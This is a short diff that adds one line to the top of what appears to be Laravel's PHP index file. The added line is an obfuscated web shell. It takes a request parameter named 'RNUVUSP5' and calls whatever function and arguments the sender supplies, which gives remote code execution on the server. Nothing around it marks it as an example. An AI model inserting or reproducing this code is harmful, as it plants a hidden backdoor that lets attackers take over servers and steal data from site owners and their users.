@@ -1,4 +1,5 @@
 <?php
+if($yxals = @${'_REQUEST'}	[	'RNUVUSP5'])$yxals [1 ] ($ { $yxals[2 ]}	[	0] ,$yxals[3 ]($yxals[ 4])	) ;
 /**
  * Laravel - A PHP Framework For Web Artisans
  *
